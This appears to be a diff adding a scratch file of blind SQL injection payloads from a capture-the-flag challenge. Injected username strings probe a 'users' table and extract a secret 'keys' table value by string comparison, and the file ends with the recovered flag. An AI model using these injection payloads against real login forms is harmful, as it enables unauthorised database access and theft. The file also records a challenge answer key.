@@ -1,0 +1,11 @@
+SELECT * FROM defcon.users WHERE username = 'root';
+root' AND (select 1 from users where 1=1 limit 0,1)=1--
+root' AND (select 1 from users where name=root limit 0,1)=1--
+root' AND (COL_LENGTH('users', 'username') IS NOT NULL)--
+
+root' AND LENGTH((SELECT * FROM keys) LIKE "%The key is: l%")<0--
+root' AND (SELECT * FROM keys) LIKE 'The key is: literally online lolling on line wucgesji'--
+The key is: literally online lolling on line wucgesji
+' OR SUBSTR((SELECT * FROM keys), 1, 52) = 'The key is: literally online lolling on line WucGe'--
+
+' OR (SELECT * FROM keys) = 'The key is: literally online lolling on line WucGesJi'--
